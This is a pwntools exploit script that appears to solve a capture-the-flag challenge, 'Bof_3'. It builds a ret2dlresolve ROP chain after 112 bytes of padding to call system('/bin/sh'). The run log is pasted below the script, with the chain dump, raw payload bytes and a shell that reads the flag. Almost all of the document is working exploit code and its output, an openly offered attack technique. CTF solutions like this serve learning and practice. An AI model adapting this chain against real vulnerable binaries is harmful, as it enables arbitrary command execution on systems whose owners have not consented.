from pwn import *
 
context.arch='i386'
 
p = process("./Bof_3")
context.binary = elf = ELF('./Bof_3')

rop = ROP(context.binary)
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
raw_rop = rop.chain()
 
log.success("ROP idea : " + str(rop.dump()))
log.success("row ROP : " + str(raw_rop))
log.success("dl_resolve payload : " + str(dlresolve.payload))
# EIP overwritten after a padding of 112 bytes
# Max input of 150 bytes
payload = fit({112: raw_rop, 150: dlresolve.payload})
log.success("FINAL PAYLOAD : " + str(payload))
 
p.sendline(payload)
p.interactive()

"""
$ python3 solve.py
[+] Starting local process './Bof_3': pid 14489
[*] '/root/pwn/CyberThreatForce-CTF/Bof3_ret2dl_resolve/Bof_3'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] Loaded 10 cached gadgets for './Bof_3'
[+] ROP idea : 0x0000:        0x8049050 read(0, 0x804ce00)
    0x0004:        0x80492d2 <adjust @0x10> pop edi; pop ebp; ret
    0x0008:              0x0 arg0
    0x000c:        0x804ce00 arg1
    0x0010:        0x8049030 [plt_init] system(0x804ce28)
    0x0014:           0x4a18 [dlresolve index]
    0x0018:          b'gaaa' <return address>
    0x001c:        0x804ce28 arg0
[+] row ROP : b'P\x90\x04\x08\xd2\x92\x04\x08\x00\x00\x00\x00\x00\xce\x04\x080\x90\x04\x08\x18J\x00\x00gaaa(\xce\x04\x08'
[+] dl_resolve payload : b'system\x00acaaadaaa\xf0J\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xce\x04\x08\x07\xbb\x04\x00/bin/sh\x00'
[+] FINAL PAYLOAD : b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabP\x90\x04\x08\xd2\x92\x04\x08\x00\x00\x00\x00\x00\xce\x04\x080\x90\x04\x08\x18J\x00\x00gaaa(\xce\x04\x08laabmasystem\x00acaaadaaa\xf0J\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xce\x04\x08\x07\xbb\x04\x00/bin/sh\x00'
[*] Switching to interactive mode
password: 
$ cat flag.txt
CTF{Sup3r_fl4g_p4s_3n_l0c4l}
"""
